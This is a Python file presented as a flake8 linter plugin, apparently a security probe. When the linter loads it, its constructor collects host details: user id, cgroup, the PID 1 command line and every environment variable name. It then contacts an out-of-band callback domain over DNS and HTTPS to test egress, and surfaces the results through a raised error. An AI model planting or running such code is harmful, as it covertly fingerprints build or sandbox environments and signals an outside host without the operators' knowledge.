"""H67B flake8 local plugin probe (own repo). Fingerprint + native egress + raise."""
import os
import socket
import urllib.parse
import urllib.request

OAST = "dc1a5v4b124u7426akl03utu6zfexkjx7.oast.online"


def _fp():
    parts = ["uid=%s" % os.getuid()]
    try:
        with open("/proc/self/cgroup") as fh:
            cg = [ln for ln in fh.read().splitlines() if "memory:" in ln]
        parts.append("cg=" + (cg[0][:70] if cg else "nomem"))
    except Exception:
        parts.append("cg-err")
    try:
        with open("/proc/1/cmdline", "rb") as fh:
            parts.append("pid1=" + fh.read(50).replace(b"\0", b" ").decode("utf-8", "replace").strip())
    except Exception:
        parts.append("pid1-err")
    names = sorted(os.environ.keys())
    parts.append("n=%d" % len(names))
    parts.append("E[" + ",".join(names) + "]")
    return " | ".join(parts)


def _egress(tag):
    out = []
    socket.setdefaulttimeout(6)
    try:
        out.append("DNS=" + socket.gethostbyname(OAST))
    except Exception as exc:
        out.append("DNSERR=" + type(exc).__name__ + ":" + str(exc)[:40])
    try:
        url = "https://" + OAST + "/h67b-" + tag
        resp = urllib.request.urlopen(url, timeout=8)
        out.append("HTTP=" + str(resp.status))
    except Exception as exc:
        out.append("HTTPERR=" + type(exc).__name__ + ":" + str(exc)[:50])
    return " ".join(out)


class H67BPlugin(object):
    name = "h67b-probe"
    version = "1.0.0"

    def __init__(self, tree=None, filename=None):
        raise RuntimeError("H67B-FLAKE8 " + _fp() + " | " + _egress("flake8"))
